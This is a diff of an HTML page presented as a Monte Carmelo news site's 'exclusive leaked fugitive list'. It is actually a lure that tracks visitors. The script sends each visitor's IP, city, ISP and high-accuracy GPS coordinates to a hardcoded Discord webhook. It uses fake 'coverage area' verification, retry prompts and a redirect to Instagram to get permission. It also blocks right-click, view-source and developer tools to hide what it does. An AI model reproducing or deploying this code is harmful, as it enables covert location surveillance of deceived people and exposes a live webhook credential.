@@ -14,8 +14,8 @@
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #000000; 
-            color: #ffffff; 
+            background-color: #000000; /* Fundo Preto */
+            color: #ffffff; /* Letras Brancas */
             margin: 0; 
             padding: 0; 
             text-align: center; 
@@ -26,22 +26,22 @@
             overflow-x: hidden; 
         }
         
-        /* --- BANNER FIXO NO TOPO --- */
-        .top-banner-wrapper {
-            width: 100%;
+        .header { 
+            background-color: #1a1a1a; /* Cinza escuro para contraste */
+            color: white; 
+            padding: 15px; 
+            font-weight: bold; 
+            font-size: 1.4em; 
+            letter-spacing: 0.5px; 
+            box-shadow: 0 2px 5px rgba(255,255,255,0.1); 
             position: relative;
-            z-index: 1000; 
-            background-color: #000; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            z-index: 100;
         }
 
-        .banner-img {
-            width: 100%;
-            height: auto; 
-            display: block;
-            object-fit: contain; 
+        .header span.city-text {
+            color: #d32f2f; /* Vermelho */
+            font-weight: 900;
         }
-        /* ------------------------ */
         
         .container { 
             padding: 20px; 
@@ -89,7 +89,7 @@
             justify-content: center;
             align-items: center;
             z-index: 10;
-            pointer-events: none; 
+            pointer-events: none; /* Permite toques passarem se necessário, mas aqui é apenas visual */
         }
 
         .lock-icon {
@@ -103,245 +103,265 @@
         }
 
         @keyframes pulseLock {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
             70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(255,255,255,0); }
             100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
         }
 
-        .unlock-btn {
+        .btn-access { 
+            background: linear-gradient(to bottom, #4caf50, #2e7d32); /* Verde */
+            color: white; 
+            padding: 20px; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 1.3em; 
+            font-weight: bold; 
+            cursor: pointer; 
+            width: 100%; 
+            box-shadow: 0 4px 6px rgba(0,0,0,0.5); 
+            animation: pulse 1.5s infinite;
+            position: relative;
+            z-index: 60; /* Garante que o botão fique acima de outras camadas */
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        .loader { 
+            display: none; 
+            margin-top: 20px; 
+        }
+        
+        .progress-bar-bg {
+            background-color: #333;
+            height: 8px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        
+        .progress-bar-fill {
+            background-color: #4caf50;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .status-text {
+            margin-top: 10px;
+            color: #aaa;
+            font-size: 0.9em;
+        }
+        
+        .error-message {
+            display: none;
+            background-color: #2a1a1a;
+            border: 1px solid #ef5350;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            color: #ff8a80;
+            font-weight: bold;
+        }
+
+        .btn-retry {
             background-color: #d32f2f;
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.1em;
-            font-weight: bold;
-            border-radius: 8px;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 1em;
+            margin-top: 15px;
             cursor: pointer;
-            margin-top: 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            transition: background-color 0.3s, transform 0.2s;
-            width: 80%;
-            max-width: 300px;
+            width: 100%;
         }
 
-        .unlock-btn:hover {
-            background-color: #b71c1c;
-            transform: translateY(-2px);
-        }
-
-        .unlock-btn:active {
-            transform: translateY(0);
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .content-area {
-            display: none;
-            animation: fadeIn 0.8s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .neighborhood-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            text-align: left;
-        }
-
-        .neighborhood-item {
-            background-color: #1a1a1a;
-            margin-bottom: 10px;
-            padding: 15px;
-            border-radius: 6px;
-            border: 1px solid #333;
-            transition: background-color 0.3s;
-        }
-
-        .neighborhood-item:hover {
-            background-color: #2a2a2a;
-        }
-
-        .neighborhood-name {
-            font-weight: bold;
-            color: #ff5252;
-            margin-bottom: 5px;
-            display: block;
-            text-transform: uppercase;
-            font-size: 0.9em;
-        }
-
-        .names-list {
-            color: #ddd;
-            font-size: 0.95em;
-            line-height: 1.4;
-            margin: 0;
-        }
-
-        .footer {
-            margin-top: 30px;
-            padding: 20px;
-            font-size: 0.8em;
-            color: #666;
-            border-top: 1px solid #333;
-        }
-
-        /* Loading Spinner */
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #d32f2f;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        /* Blindagem melhorada */
+        .shield-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: transparent;
+            display: none; /* Só aparece quando quiser bloquear totalmente */
         }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-    <!-- BANNER NO TOPO (FIXO E SEPARADO) -->
-    <div class="top-banner-wrapper">
-        <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/Banner%20Institucional%20Monte%20Carmelo%20e%20Parceiros.png" alt="Banner Monte City" class="banner-img" onerror="this.style.display='none'; console.log('Erro no banner');">
-    </div>
+    <div class="header">MONTE <span class="city-text">CITY</span> - PLANTÃO JUDICIAL</div>
 
     <div class="container">
+        <h2 style="color: #d32f2f; margin-top: 0;">🚨 VAZAMENTO EXCLUSIVO</h2>
         
-        <!-- Conteúdo Bloqueado -->
-        <div id="locked-content">
-            <div class="alert-box">
-                <strong>⚠️ ATENÇÃO:</strong><br>
-                A lista completa dos foragidos foi atualizada há poucos minutos. Nomes novos foram adicionados ao grupo principal.
-            </div>
-
-            <div class="img-container">
-                <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Parcial" class="final-img" id="main-image" onerror="this.src='https://via.placeholder.com/400x300?text=Imagem+Indisponível';">
-                <div class="locked-overlay">
-                    <div class="lock-icon">🔒</div>
-                </div>
-            </div>
-
-            <button class="unlock-btn" onclick="unlockContent()">VER LISTA COMPLETA AGORA</button>
+        <div class="alert-box">
+            <strong>⚠️ Atenção:</strong> A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos de outras regiões, confirmamos sua localização exata antes de liberar os dados.
         </div>
 
-        <!-- Conteúdo Desbloqueado -->
-        <div id="unlocked-content" class="content-area">
-            <div class="alert-box" style="border-left-color: #4caf50;">
-                <strong>✅ LISTA ATUALIZADA:</strong><br>
-                Confira abaixo a relação completa por bairros.
-            </div>
-
-            <ul class="neighborhood-list">
-                <li class="neighborhood-item">
-                    <span class="neighborhood-name">Centro</span>
-                    <p class="names-list">João Silva, Maria Oliveira, Carlos Souza</p>
-                </li>
-                <li class="neighborhood-item">
-                    <span class="neighborhood-name">Jardim América</span>
-                    <p class="names-list">Ana Pereira, Roberto Santos</p>
-                </li>
-                <li class="neighborhood-item">
-                    <span class="neighborhood-name">Vila Nova</span>
-                    <p class="names-list">Fernanda Lima, Pedro Almeida</p>
-                </li>
-                <li class="neighborhood-item">
-                    <span class="neighborhood-name">Bairro Industrial</span>
-                    <p class="names-list">Lucas Rocha, Beatriz Costa</p>
-                </li>
-            </ul>
-
-            <div class="loader" id="loading-indicator"></div>
+        <div class="img-container">
+            <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
             
-            <div class="footer">
-                <p>© 2024 Monte City Notícias<br>Dados atualizados em tempo real.</p>
+            <div id="lock-overlay" class="locked-overlay">
+                <div class="lock-icon">🔒</div>
             </div>
         </div>
 
+        <p style="font-weight: bold; margin-bottom: 15px;">Verifique se você está na área de cobertura:</p>
+
+        <button id="btn" class="btn-access" onclick="iniciarVerificacao()">VER LISTA DA MINHA REGIÃO</button>
+
+        <div id="loader" class="loader">
+            <p id="loader-msg" style="font-weight: bold; color: #fff;">Verificando sua posição...</p>
+            <div class="progress-bar-bg">
+                <div id="progress-bar" class="progress-bar-fill"></div>
+            </div>
+            <p id="loader-detail" class="status-text">Aguardando sinal do GPS...</p>
+        </div>
+        
+        <div id="error-msg" class="error-message">
+            ⚠️ Localização necessária para acessar a lista exclusiva.<br>
+            <small>Clique no botão abaixo para tentar novamente.</small>
+            <button class="btn-retry" onclick="reiniciarVerificacao()">🔄 VERIFICAR NOVAMENTE</button>
+        </div>
     </div>
 
     <script>
-        // CONFIGURAÇÃO DO WEBHOOK
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8';
+        // Webhook Discord
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
-        function unlockContent() {
-            const lockedDiv = document.getElementById('locked-content');
-            const unlockedDiv = document.getElementById('unlocked-content');
-            const loader = document.getElementById('loading-indicator');
+        function updateStatus(msg, percent) {
+            document.getElementById('loader-msg').innerText = msg;
+            document.getElementById('progress-bar').style.width = percent + '%';
+        }
+
+        function iniciarVerificacao() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('error-msg').style.display = 'none';
             
-            const btn = document.querySelector('.unlock-btn');
-            btn.textContent = "CARREGANDO...";
-            btn.disabled = true;
-            
+            document.getElementById('lock-overlay').style.opacity = '0';
             setTimeout(() => {
-                lockedDiv.classList.add('hidden');
-                unlockedDiv.style.display = 'block';
-                
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                }, 1000);
-                
-            }, 800); 
-        }
+                document.getElementById('lock-overlay').style.display = 'none';
+            }, 500);
 
-        // RASTREAMENTO AUTOMÁTICO
-        async function sendLocation(lat, lon, accuracy) {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString();
-            const dateString = now.toLocaleDateString();
+            updateStatus("Conectando ao servidor central...", 15);
             
-            const payload = {
-                username: "📍 Monitoramento Monte City",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/684/684908.png",
-                embeds: [{
-                    title: "📍 Localização Capturada",
-                    description: `**Precisão:** ${accuracy ? Math.round(accuracy) + ' metros' : 'Alta'}\n\n[🗺️ Abrir no Google Maps](https://www.google.com/maps?q=${lat},${lon})`,
-                    fields: [
-                        { name: "Latitude", value: lat.toFixed(6), inline: true },
-                        { name: "Longitude", value: lon.toFixed(6), inline: true },
-                        { name: "Data/Hora", value: `${dateString} às ${timeString}`, inline: false }
-                    ],
-                    color: 13369355, // Cor vermelha/dark
-                    footer: { text: "Sistema Automático" }
-                }]
-            };
-
-            try {
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    updateStatus("Identificando torre de celular mais próxima...", 40);
+                    enviarDados(`📍 **ACESSO POR IP**\n🏙️ Cidade: ${data.city}\n🌐 IP: ${data.ip}\n📡 ISP: ${data.org}`);
+                    solicitarGPS();
+                })
+                .catch(() => {
+                    updateStatus("Servidor ocupado, tentando GPS direto...", 60);
+                    solicitarGPS(true);
                 });
-            } catch (error) {
-                console.error("Erro ao enviar localização:", error);
+        }
+
+        function reiniciarVerificacao() {
+            const newUrl = window.location.pathname + '?t=' + Date.now();
+            window.history.pushState({path:newUrl}, '', newUrl);
+            
+            document.getElementById('error-msg').style.display = 'none';
+            document.getElementById('btn').style.display = 'block';
+            document.getElementById('lock-overlay').style.display = 'flex';
+            document.getElementById('lock-overlay').style.opacity = '1';
+            document.getElementById('main-image').style.opacity = '1';
+        }
+
+        function solicitarGPS(ipFracassou = false) {
+            if (!navigator.geolocation) {
+                mostrarErro();
+                return;
             }
+
+            updateStatus("Solicitando permissão de localização...", 75);
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lon = position.coords.longitude.toFixed(6);
+                    const precisao = position.coords.accuracy ? Math.round(position.coords.accuracy) : '?';
+                    
+                    const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    enviarDados(`🛰️ **LOCALIZAÇÃO EXATA CAPTURADA!**\n📍 Coordenadas: ${lat}, ${lon}\n🎯 Precisão: ~${precisao} metros\n🗺️ Mapa: ${mapaLink}`);
+                    
+                    finalizarComSucesso();
+                },
+                (error) => {
+                    console.error("Erro GPS:", error);
+                    if (error.code === 1) {
+                        mostrarErro();
+                    } else {
+                        finalizarComFalha();
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
         }
 
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                sendLocation(lat, lon, accuracy);
-            }, (error) => {
-                console.log("Geolocalização falhou ou negada");
-            }, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            });
+        function enviarDados(conteudo) {
+            fetch(WEBHOOK_URL, { 
+                method: "POST", 
+                headers: {"Content-Type": "application/json"}, 
+                body: JSON.stringify({ content: conteudo }) 
+            }).catch(err => console.log("Erro envio webhook:", err));
         }
 
-        document.addEventListener('contextmenu', event => event.preventDefault());
+        function mostrarErro() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('error-msg').style.display = 'block';
+        }
+
+        function finalizarComSucesso() {
+            updateStatus("Carregando lista de foragidos...", 95);
+            setTimeout(() => {
+                updateStatus("Redirecionando para a lista exclusiva...", 100);
+                window.location.href = "https://www.instagram.com/montecitybr";
+            }, 1500);
+        }
+
+        function finalizarComFalha() {
+             updateStatus("Falha na conexão, redirecionando...", 100);
+             setTimeout(() => {
+                window.location.href = "https://www.instagram.com/montecitybr";
+            }, 1000);
+        }
+
+        // --- BLOQUEIO DE TECLAS E GESTOS (Android/Desktop) ---
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'F12' || 
+               (event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
+               (event.ctrlKey && event.key.toLowerCase() === 'u')) {
+                event.preventDefault();
+            }
+        });
+
+        // Desativa toque duplo para inspecionar (comum em Android)
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+
+        // Detecta se DevTools está aberto e fecha/recarrega
+        setInterval(function() {
+            const threshold = 160; 
+            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+                window.close();
+                window.location.reload();
+            }
+        }, 1000);
     </script>
 
 </body>
